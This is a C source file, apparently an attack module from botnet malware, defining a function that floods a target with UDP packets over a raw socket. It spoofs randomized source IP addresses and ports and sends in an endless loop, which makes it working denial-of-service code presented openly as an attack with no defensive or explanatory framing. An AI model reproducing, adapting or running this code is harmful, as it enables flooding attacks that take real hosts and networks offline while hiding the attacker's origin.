#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "udp_attack.h"
#include "checksum.h"
#include "types.h"

void attack_udp(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct udp_hdr *udph = (struct udp_hdr *)(buffer + sizeof(struct ip_hdr));
	struct sockaddr_in addr;
	int sockfd;

	srand(time(NULL));
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->length = sizeof(struct ip_hdr) + sizeof(struct udp_hdr);
	iph->ident = rand() & 0xfff;
	iph->frag = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_UDP;
	iph->checksum = 0;
	iph->src_addr = rand();
	iph->dst_addr = target->target_addr;

	udph->src_port = rand() & 0xffff;
	udph->dst_port = rand() & 0xffff;
	udph->length = htons(sizeof(struct udp_hdr));
	udph->checksum = 0;

	addr.sin_family = AF_INET;
	addr.sin_port = 0;
	addr.sin_addr.s_addr = target->target_addr;

	/* initialize raw socket */
	if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
		exit(EXIT_FAILURE);
	}

	int enable = 1;
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
		exit(EXIT_FAILURE);
	}

	while (1) {
		iph->ident = rand() & 0xffff;
		iph->src_addr = rand();
		iph->checksum = 0;
		iph->checksum = checksum_generic((uint16_t *)iph, iph->length);

		udph->src_port = rand() & 0xffff;
		udph->dst_port = rand() & 0xffff;
		udph->checksum = 0;
		udph->checksum = checksum_udp(iph, udph, NULL, 0);

		if (sendto(sockfd, buffer, iph->length, 0, (struct sockaddr *)&addr,
				sizeof(struct sockaddr_in)) == -1) {
			exit(EXIT_FAILURE);
		}
	}
}
